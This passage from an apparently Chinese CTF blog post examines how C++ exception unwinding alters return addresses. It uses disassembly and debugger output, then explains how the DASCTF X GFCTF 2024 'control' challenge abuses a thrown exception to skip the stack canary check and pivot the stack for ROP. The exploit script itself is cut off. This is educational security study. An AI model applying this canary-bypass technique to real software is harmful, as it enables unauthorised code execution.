class="line">Aborted</span><br></pre></td></tr></table></figure><p>程序直接aborted了。</p><p>突发奇想，我们把刚刚实验生成的程序放到IDA中看看长什么样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">test_func3</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *exception; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;func3 start&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v0, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  exception = __cxa_allocate_exception(<span class="number">4uLL</span>);</span><br><span class="line">  *exception = <span class="number">3</span>;</span><br><span class="line">  __cxa_throw(exception, (<span class="keyword">struct</span> type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span><span class="type">int</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>抛出异常部分的伪代码长这样。但是catch部分并不会出现在伪代码中，但是会体现在汇编当中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001341 ;   try &#123;</span><br><span class="line">.text:0000000000001341                 call    _Z10test_func2v ; test_func2(void)</span><br><span class="line">.text:0000000000001341 ;   &#125; // starts at 1341</span><br><span class="line">.text:0000000000001346 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000001346</span><br><span class="line">.text:0000000000001346 loc_1346:                               ; CODE XREF: test_func1(void)+A6↓j</span><br><span class="line">.text:0000000000001346                 lea     rax, aFunc1Exit ; &quot;func1 exit&quot;</span><br><span class="line">.text:000000000000134D                 mov     rsi, rax</span><br><span class="line">.text:0000000000001350                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:0000000000001357                 mov     rdi, rax</span><br><span class="line">.text:000000000000135A                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:000000000000135F                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:0000000000001366                 mov     rsi, rdx</span><br><span class="line">.text:0000000000001369                 mov     rdi, rax</span><br><span class="line">.text:000000000000136C                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:0000000000001371                 jmp     short loc_13C8</span><br><span class="line">.text:0000000000001373 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000001373 ;   catch(...) // owned by 1341</span><br><span class="line">.text:0000000000001373                 endbr64</span><br><span class="line">.text:0000000000001377                 mov     rdi, rax        ; void *</span><br><span class="line">.text:000000000000137A                 call    ___cxa_begin_catch</span><br><span class="line">.text:000000000000137F                 lea     rax, aCatch1    ; &quot;catch 1&quot;</span><br><span class="line">.text:0000000000001386                 mov     rsi, rax</span><br><span class="line">.text:0000000000001389                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:0000000000001390                 mov     rdi, rax</span><br><span class="line">.text:0000000000001393 ;   try &#123;</span><br><span class="line">.text:0000000000001393                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:0000000000001398                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:000000000000139F                 mov     rsi, rdx</span><br><span class="line">.text:00000000000013A2                 mov     rdi, rax</span><br><span class="line">.text:00000000000013A5                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:00000000000013A5 ;   &#125; // starts at 1393</span><br><span class="line">.text:00000000000013AA                 call    ___cxa_end_catch</span><br><span class="line">.text:00000000000013AF                 jmp     short loc_1346</span><br><span class="line">.text:00000000000013B1 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000013B1 ;   cleanup() // owned by 1393</span><br><span class="line">.text:00000000000013B1                 endbr64</span><br><span class="line">.text:00000000000013B5                 mov     rbx, rax</span><br><span class="line">.text:00000000000013B8                 call    ___cxa_end_catch</span><br><span class="line">.text:00000000000013BD                 mov     rax, rbx</span><br><span class="line">.text:00000000000013C0                 mov     rdi, rax        ; struct _Unwind_Exception *</span><br><span class="line">.text:00000000000013C3                 call    __Unwind_Resume</span><br><span class="line">.text:00000000000013C8 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000013C8</span><br><span class="line">.text:00000000000013C8 loc_13C8:                               ; CODE XREF: test_func1(void)+68↑j</span><br><span class="line">.text:00000000000013C8                 mov     rbx, [rbp+var_8]</span><br><span class="line">.text:00000000000013CC                 leave</span><br><span class="line">.text:00000000000013CD                 retn</span><br><span class="line">.text:00000000000013CD ; &#125; // starts at 1309</span><br><span class="line">.text:00000000000013CD _Z10test_func1v endp</span><br></pre></td></tr></table></figure><p>可以看到0x13AF处执行完catch之后jmp到了0x1346，这个地方正好对应源码里func1 exit的部分。说明catch完会直接从当前位置继续执行。</p><p>那这里就会产生一个想法，比如说我如果想通过这个劫持执行流，我是否可以直接劫持func1的返回地址就行？</p><p>网上关于异常处理漏洞利用的地方几乎完全没看懂，所以打算自己动调看看到底程序在catch的时候发生了什么。</p><h4 id="网上的说法"><a href="#网上的说法" class="headerlink" title="网上的说法"></a>网上的说法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1）调用 __cxa_allocate_exception 函数，分配一个异常对象。</span><br><span class="line">2）调用 __cxa_throw 函数，这个函数会将异常对象做一些初始化。</span><br><span class="line">3）__cxa_throw() 调用 Itanium ABI 里的 _Unwind_RaiseException() 从而开始 unwind。</span><br><span class="line">4）_Unwind_RaiseException() 对调用链上的函数进行 unwind 时，调用 personality routine。</span><br><span class="line">5）如果该异常如能被处理(有相应的 catch)，则 personality routine 会依次对调用链上的函数进行清理。</span><br><span class="line">6）_Unwind_RaiseException() 将控制权转到相应的catch代码。</span><br></pre></td></tr></table></figure><p>几乎每一篇博客都能看到这些流程，但是我看得一头雾水，直到我自己动调看了程序的变化才有点头绪。</p><h4 id="在动调里挣扎"><a href="#在动调里挣扎" class="headerlink" title="在动调里挣扎"></a>在动调里挣扎</h4><p>我用了第一个demo的程序来做动调。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001249 ; void __noreturn test_func3(void)</span><br><span class="line">.text:0000000000001249                 public _Z10test_func3v</span><br><span class="line">.text:0000000000001249 _Z10test_func3v proc near               ; CODE XREF: test_func2(void)+38↓p</span><br><span class="line">.text:0000000000001249 ; __unwind &#123;</span><br><span class="line">.text:0000000000001249                 endbr64</span><br><span class="line">.text:000000000000124D                 push    rbp</span><br><span class="line">.text:000000000000124E                 mov     rbp, rsp</span><br><span class="line">.text:0000000000001251                 lea     rax, aFunc3Start ; &quot;func3 start&quot;</span><br><span class="line">.text:0000000000001258                 mov     rsi, rax</span><br><span class="line">.text:000000000000125B                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:0000000000001262                 mov     rdi, rax</span><br><span class="line">.text:0000000000001265                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:000000000000126A                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:0000000000001271                 mov     rsi, rdx</span><br><span class="line">.text:0000000000001274                 mov     rdi, rax</span><br><span class="line">.text:0000000000001277                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:000000000000127C                 mov     edi, 4          ; thrown_size</span><br><span class="line">.text:0000000000001281                 call    ___cxa_allocate_exception</span><br><span class="line">.text:0000000000001286                 mov     dword ptr [rax], 3</span><br><span class="line">.text:000000000000128C                 mov     edx, 0          ; void (*)(void *)</span><br><span class="line">.text:0000000000001291                 lea     rcx, _ZTIi@CXXABI_1_3</span><br><span class="line">.text:0000000000001298                 mov     rsi, rcx        ; lptinfo</span><br><span class="line">.text:000000000000129B                 mov     rdi, rax        ; void *</span><br><span class="line">.text:000000000000129E                 call    ___cxa_throw</span><br><span class="line">.text:000000000000129E ; &#125; // starts at 1249</span><br><span class="line">.text:000000000000129E _Z10test_func3v endp</span><br><span class="line">.text:000000000000129E</span><br><span class="line">.text:00000000000012A3</span><br><span class="line">.text:00000000000012A3 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:00000000000012A3</span><br><span class="line">.text:00000000000012A3 ; Attributes: bp-based frame</span><br><span class="line">.text:00000000000012A3</span><br><span class="line">.text:00000000000012A3 ; void __noreturn test_func2(void)</span><br><span class="line">.text:00000000000012A3                 public _Z10test_func2v</span><br><span class="line">.text:00000000000012A3 _Z10test_func2v proc near               ; CODE XREF: test_func1(void)+38↓p</span><br><span class="line">.text:00000000000012A3</span><br><span class="line">.text:00000000000012A3 var_14          = dword ptr -14h</span><br><span class="line">.text:00000000000012A3 var_8           = qword ptr -8</span><br><span class="line">.text:00000000000012A3</span><br><span class="line">.text:00000000000012A3 ; __unwind &#123; // __gxx_personality_v0</span><br><span class="line">.text:00000000000012A3                 endbr64</span><br><span class="line">.text:00000000000012A7                 push    rbp</span><br><span class="line">.text:00000000000012A8                 mov     rbp, rsp</span><br><span class="line">.text:00000000000012AB                 push    rbx</span><br><span class="line">.text:00000000000012AC                 sub     rsp, 18h</span><br><span class="line">.text:00000000000012B0                 lea     rax, aTestFunc2 ; &quot;test func2&quot;</span><br><span class="line">.text:00000000000012B7                 mov     rsi, rax</span><br><span class="line">.text:00000000000012BA                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:00000000000012C1                 mov     rdi, rax</span><br><span class="line">.text:00000000000012C4                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:00000000000012C9                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:00000000000012D0                 mov     rsi, rdx</span><br><span class="line">.text:00000000000012D3                 mov     rdi, rax</span><br><span class="line">.text:00000000000012D6                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:00000000000012DB ;   try &#123;</span><br><span class="line">.text:00000000000012DB                 call    _Z10test_func3v ; test_func3(void)</span><br><span class="line">.text:00000000000012DB ;   &#125; // starts at 12DB</span><br><span class="line">.text:00000000000012E0 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000012E0</span><br><span class="line">.text:00000000000012E0 loc_12E0:                               ; CODE XREF: test_func2(void)+B9↓j</span><br><span class="line">.text:00000000000012E0                 lea     rax, aFunc2Exit ; &quot;func2 exit&quot;</span><br><span class="line">.text:00000000000012E7                 mov     rsi, rax</span><br><span class="line">.text:00000000000012EA                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:00000000000012F1                 mov     rdi, rax</span><br><span class="line">.text:00000000000012F4                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:00000000000012F9                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:0000000000001300                 mov     rsi, rdx</span><br><span class="line">.text:0000000000001303                 mov     rdi, rax</span><br><span class="line">.text:0000000000001306                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:000000000000130B                 jmp     short loc_1375</span><br><span class="line">.text:000000000000130D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000000130D ;   catch(_ZTIi@CXXABI_1_3) // owned by 12DB</span><br><span class="line">.text:000000000000130D                 endbr64</span><br><span class="line">.text:0000000000001311                 cmp     rdx, 1</span><br><span class="line">.text:0000000000001315                 jz      short loc_131F</span><br><span class="line">.text:0000000000001317                 mov     rdi, rax        ; struct _Unwind_Exception *</span><br><span class="line">.text:000000000000131A                 call    __Unwind_Resume</span><br><span class="line">.text:000000000000131F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000000131F</span><br><span class="line">.text:000000000000131F loc_131F:                               ; CODE XREF: test_func2(void)+72↑j</span><br><span class="line">.text:000000000000131F                 mov     rdi, rax        ; void *</span><br><span class="line">.text:0000000000001322                 call    ___cxa_begin_catch</span><br><span class="line">.text:0000000000001327                 mov     eax, [rax]</span><br><span class="line">.text:0000000000001329                 mov     [rbp+var_14], eax</span><br><span class="line">.text:000000000000132C                 lea     rax, aCatch2    ; &quot;catch 2&quot;</span><br><span class="line">.text:0000000000001333                 mov     rsi, rax</span><br><span class="line">.text:0000000000001336                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:000000000000133D                 mov     rdi, rax</span><br><span class="line">.text:0000000000001340 ;   try &#123;</span><br><span class="line">.text:0000000000001340                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:0000000000001345                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:000000000000134C                 mov     rsi, rdx</span><br><span class="line">.text:000000000000134F                 mov     rdi, rax</span><br><span class="line">.text:0000000000001352                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:0000000000001352 ;   &#125; // starts at 1340</span><br><span class="line">.text:0000000000001357                 call    ___cxa_end_catch</span><br><span class="line">.text:000000000000135C                 jmp     short loc_12E0</span><br><span class="line">.text:000000000000135E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000000135E ;   cleanup() // owned by 1340</span><br><span class="line">.text:000000000000135E                 endbr64</span><br><span class="line">.text:0000000000001362                 mov     rbx, rax</span><br><span class="line">.text:0000000000001365                 call    ___cxa_end_catch</span><br><span class="line">.text:000000000000136A                 mov     rax, rbx</span><br><span class="line">.text:000000000000136D                 mov     rdi, rax        ; struct _Unwind_Exception *</span><br><span class="line">.text:0000000000001370                 call    __Unwind_Resume</span><br><span class="line">.text:0000000000001375 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000001375</span><br><span class="line">.text:0000000000001375 loc_1375:                               ; CODE XREF: test_func2(void)+68↑j</span><br><span class="line">.text:0000000000001375                 mov     rbx, [rbp+var_8]</span><br><span class="line">.text:0000000000001379                 leave</span><br><span class="line">.text:000000000000137A                 retn</span><br><span class="line">.text:000000000000137A ; &#125; // starts at 12A3</span><br><span class="line">.text:000000000000137A _Z10test_func2v endp</span><br></pre></td></tr></table></figure><p>首先先断点在<code>.text:000000000000129E                 call    ___cxa_throw</code>上，即func3即将抛出异常的地方，可以看到此时func3的ret地址是func2正常退出的地址(func2+61)</p><p><img src="https://c-lby.top/images/cpp_exception/func3%E6%96%AD%E7%82%B9ret%E5%9C%B0%E5%9D%80%E6%AD%A3%E5%B8%B8.png" alt="func3断点ret地址正常"></p><p>如果此时直接步过<code>__cxa_throw</code>，程序直接就往后执行完退出了，说明所有问题都出在这个函数里。因此我们步进去看看会发生什么。</p><p>步进之后可以进一步发现问题出在<code>_Unwind_RaiseException</code>函数里。这个函数实在是过于复杂，我在2024GFCTF中的control那道题里找到了这个函数的汇编代码（因为他是静态编译的），从加载出来的符号表可以看出这个函数的主要作用是更改上下文。</p><p>从实际效果出发来说的话就是他把func3的返回地址从func2的正常退出改成了func2中的catch块。</p><p>这里我偷了个懒，我直接在0x130D处下了断点，也就是刚开始执行func2的catch块的地方，然后关注栈上func3栈帧的返回地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">telescope 0x7fffffffdb50</span></span><br><span class="line">00:0000│-030     0x7fffffffdb50 —▸ 0x7fffffffdb80 —▸ 0x7fffffffdba0 —▸ 0x7fffffffdbb0 ◂— 0x1</span><br><span class="line">01:0008│-028     0x7fffffffdb58 —▸ 0x55555555530d (test_func2()+106) ◂— endbr64</span><br><span class="line">02:0010│ rdi rsp 0x7fffffffdb60 —▸ 0x7fffffffdcc8 —▸ 0x7fffffffdf45 ◂— &#x27;/mnt/c/Users/31386/Desktop/tmp&#x27;</span><br><span class="line">03:0018│-018     0x7fffffffdb68 ◂— 0xd6e057b5651d2000</span><br><span class="line">04:0020│-010     0x7fffffffdb70 ◂— 0x0</span><br><span class="line">05:0028│-008     0x7fffffffdb78 ◂— 0x0</span><br><span class="line">06:0030│ rbp     0x7fffffffdb80 —▸ 0x7fffffffdba0 —▸ 0x7fffffffdbb0 ◂— 0x1</span><br><span class="line">07:0038│+008     0x7fffffffdb88 —▸ 0x5555555553b8 (test_func1()+61) ◂— lea rax, [rip + 0xc7a]</span><br></pre></td></tr></table></figure><p>很明显，func3的返回地址从<code>func2+61</code>变成了<code>func2+106</code>。这就给了我们一个启示：其实可以像正常rop一样劫持ret地址的。但是有一个疑问在于，明明throw往往会比栈溢出更先发生，那岂不是劫持好的ret地址又被修改了？事实上在一些情况下并不会发生，但是百思不得其解。迫不得已，去找找源码。<a href="https://blog.csdn.net/lidan113lidan/article/details/121865210">资料</a> <a href="https://github.com/gcc-mirror/gcc/blob/master/libgcc/unwind.inc">源码</a></p><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/generic/unwind-dw2.c#L940">libc</a>里只能找到关于上下文设置的函数，没有<code>_Unwind_RaiseException</code>的，一番搜索之后发现他在gcc的源码里。这意味这什么？这意味这其实这部分处理早在编译的时候就已经做好预处理了，而非程序运行才来处理，是更底层的实现，比如像这个函数是怎么找到catch块的这样的问题。</p><p>结合上面两篇资料的分析（我想大概是基于LSDA的检查），加上我自己对源码的理解，应该可以得出一个结论：只要ret地址劫持的是catch块就可以绕过检查，直接break结束循环寻找catch的过程。经过实验发现只要是位于try和catch之间的地址都是合法的。<strong>因为资料里有太多看不懂的术语，不确定我的理解是否正确，所以这里只是我的想法，仅有少量实验，未经过严谨的推断，准确性有待商榷。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">/* Unwind successful.  Run the personality routine, if any.  */</span></span><br><span class="line">     <span class="keyword">if</span> (fs.personality)</span><br><span class="line">&#123;</span><br><span class="line">  code = (*fs.personality) (<span class="number">1</span>, _UA_SEARCH_PHASE, exc-&gt;exception_class,</span><br><span class="line">    exc, &amp;cur_context);</span><br><span class="line">  <span class="keyword">if</span> (code == _URC_HANDLER_FOUND)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (code != _URC_CONTINUE_UNWIND)</span><br><span class="line">    <span class="keyword">return</span> _URC_FATAL_PHASE1_ERROR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然这只是有关异常处理利用的其中一种方式而已，我见到更多的其实是利用它不执行后续代码来绕过canary然后打栈迁移的。</p><h3 id="DASCTF-X-GFCTF-2024-control"><a href="#DASCTF-X-GFCTF-2024-control" class="headerlink" title="DASCTF X GFCTF 2024  control"></a>DASCTF X GFCTF 2024  control</h3><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r9d</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;welcome to control&quot;</span>, argv);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s answer some question&quot;</span>, argv);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;Gift&gt; &quot;</span>, (_DWORD)argv, v3, v4, v5, v6);</span><br><span class="line">  read(<span class="number">0LL</span>, &amp;gift, <span class="number">16LL</span>);</span><br><span class="line">  <span class="keyword">return</span> vuln(<span class="number">0LL</span>, (__int64)&amp;gift);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">vuln</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *exception; <span class="comment">// rax</span></span><br><span class="line">  _BYTE v4[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How much do you know about control?&quot;</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)read(<span class="number">0LL</span>, v4, <span class="number">0x100</span>LL) &gt; <span class="number">96</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    exception = _cxa_allocate_exception(<span class="number">8uLL</span>);</span><br><span class="line">    *exception = <span class="string">&quot;WRONGING! This answer is not suit&quot;</span>;</span><br><span class="line">    _cxa_throw(exception, (<span class="keyword">struct</span> type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span><span class="type">char</span> <span class="type">const</span>*, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序开头允许向bss段输入16个字节，然后在vuln函数中有cpp的异常处理函数，同时有0x30大小的栈溢出。可以看到当输入大于0x60的时候，就会触发异常处理。<strong>触发异常处理后，该函数后面的代码不再执行。</strong>所以就算破坏了canary程序也不一定会直接退出（之所以说不一定是因为有可能异常处理函数就是退出处理）。</p><p>看汇编会发现vuln函数里并没有catch，main函数中有catch，所以vuln函数中的栈溢出检查就不会被执行，会从main继续往下执行，main结束时会返回，所以只要劫持rbp到bss段上就可以进行rop了。</p><p>刚好一开始可以写16个字节，可以提前布置好binsh和ret地址，让main返回之后再次执行vuln函数。方便起见，可以直接劫持ret地址为read处，这样可以绕过栈初始化，就不用再动调看偏移了。</p><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 